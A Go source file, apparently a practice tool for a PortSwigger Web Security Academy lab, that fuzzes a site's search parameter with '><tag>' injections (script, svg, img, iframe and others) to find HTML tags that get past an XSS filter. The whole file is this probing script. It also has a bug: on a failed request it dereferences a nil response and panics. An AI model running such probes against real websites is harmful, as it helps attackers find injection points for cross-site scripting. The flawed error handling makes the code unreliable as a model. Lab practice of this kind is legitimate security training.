package XSS

import (
	"fmt"
	"net/http"
	"net/url"
	"sync"
	"time"
)

const (
	URL     = "https://0a65004504a7954781c6484c00bc0049.h1-web-security-academy.net/"
	MaxWork = 10
)

type Result struct {
	Tag     string
	IsValid bool
	Error   error
}

func worker(id int, jobs <-chan string, results chan<- Result, wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{
		Timeout: time.Second * 5,
	}
	for tag := range jobs {
		rawPayload := fmt.Sprintf("><%s>", tag)
		encodePayload := url.QueryEscape(rawPayload)
		reqUrl := fmt.Sprintf("%s?search=%s", URL, encodePayload)

		resp, err := client.Get(reqUrl)
		if err != nil {
			results <- Result{Tag: tag, IsValid: false, Error: err}
		}
		isValid := false
		if resp.StatusCode == 200 {
			isValid = true
		}
		resp.Body.Close()

		results <- Result{Tag: tag, IsValid: isValid, Error: err}
	}

}

func Do() {
	payloads := []string{"script", "svg", "img", "animatetransform", "iframe", "image"}

	jobs := make(chan string, len(payloads))
	results := make(chan Result, len(payloads))
	var wg sync.WaitGroup

	for w := 1; w <= MaxWork; w++ {
		wg.Add(1)
		go worker(w, jobs, results, &wg)
	}

	for _, tag := range payloads {
		jobs <- tag
	}
	close(jobs)
	go func() {
		wg.Wait()
		close(results)
	}()

	for res := range results {
		if res.Error != nil {

		} else if res.IsValid {
			fmt.Println("Found Tag for " + res.Tag)
		}
	}
}
